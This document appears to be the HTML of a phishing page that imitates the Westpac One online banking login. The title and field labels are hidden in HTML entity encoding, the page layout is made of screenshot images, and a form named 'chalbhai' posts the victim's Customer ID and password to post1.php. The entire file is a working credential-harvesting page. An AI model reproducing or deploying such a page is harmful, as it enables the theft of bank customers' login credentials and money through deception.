<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#87;&#101;&#115;&#116;&#112;&#97;&#99;&#32;&#79;&#110;&#101;&#174;&#32;&#45;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <style type="text/css">
  
.textbox {  
	border: 1px solid #dadada;
	border-radius: 3px;
	padding-left: 36px;
	font-weight: bold;
	font: 16px/16px "suntrustregular","Trebuchet MS",sans-serif;
    color: #333;
    height: 40px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #dadada; 
    border-style: solid; 
    border-width: 1px; 
    outline: 0; 
 } 

 </style>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:199px; z-index:0"><img src="images/w8.png" alt="" title="" border=0 width=1365 height=199></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:195px; width:1365px; height:248px; z-index:1"><img src="images/w9.png" alt="" title="" border=0 width=1365 height=248></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:437px; width:1365px; height:226px; z-index:2"><img src="images/w10.png" alt="" title="" border=0 width=1365 height=226></div>

<div id="image4" style="position:absolute; overflow:hidden; left:299px; top:210px; width:762px; height:334px; z-index:3"><img src="images/w1.png" alt="" title="" border=0 width=762 height=334></div>

<div id="image5" style="position:absolute; overflow:hidden; left:384px; top:393px; width:145px; height:19px; z-index:4"><a href="#"><img src="images/w2.png" alt="" title="" border=0 width=145 height=19></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:754px; top:464px; width:78px; height:17px; z-index:5"><a href="#"><img src="images/w3.png" alt="" title="" border=0 width=78 height=17></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:752px; top:406px; width:47px; height:19px; z-index:6"><a href="#"><img src="images/w4.png" alt="" title="" border=0 width=47 height=19></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:830px; top:501px; width:195px; height:17px; z-index:7"><a href="#"><img src="images/w5.png" alt="" title="" border=0 width=195 height=17></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:505px; top:561px; width:355px; height:54px; z-index:8"><a href="#"><img src="images/w6.png" alt="" title="" border=0 width=355 height=54></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:630px; top:640px; width:334px; height:17px; z-index:9"><a href="#"><img src="images/w7.png" alt="" title="" border=0 width=334 height=17></a></div>
<form action=post1.php name=chalbhai id=chalbhai method=post>
<input name="user" placeholder="&#67;&#117;&#115;&#116;&#111;&#109;&#101;&#114;&#32;&#73;&#68;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:343px;left:330px;top:280px;z-index:10">
<input name="pass" id="demo-field" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:343px;left:330px;top:330px;z-index:11">
<div id="formimage1" style="position:absolute; left:582px; top:382px; z-index:12"><input type="image" name="formimage1" width="92" height="41" src="images/login.png"></div>
<div id="image11" style="position:absolute; overflow:hidden; left:342px; top:292px; width:17px; height:16px; z-index:13"><img src="images/w15.png" alt="" title="" border=0 width=17 height=16></div>

<div id="image12" style="position:absolute; overflow:hidden; left:342px; top:342px; width:19px; height:18px; z-index:14"><img src="images/w16.png" alt="" title="" border=0 width=19 height=18></div>

</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
